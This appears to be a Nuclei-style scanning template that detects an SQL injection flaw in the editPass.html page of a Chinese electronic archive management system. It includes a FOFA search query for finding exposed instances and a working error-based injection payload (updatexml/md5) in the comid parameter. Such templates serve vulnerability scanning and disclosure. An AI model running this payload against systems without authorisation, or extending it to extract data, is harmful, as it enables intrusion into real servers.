id: poc-yaml-thams-editpass-sqli
info:
  name: 紫光电子档案管理系统editPass.html存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 紫光电子档案管理系统
    fofa-query: app="紫光档案管理系统"
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: GET
    path:
      - "{{BaseURL}}/login/Login/editPass.html?comid=(updatexml(1,concat(0x7e,(select%20md5({{t1}})),0x7e),1))"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "SQLException"
        part: body
      - type: word
        words:
          - "{{substr(t2,0,31)}}"
        part: body
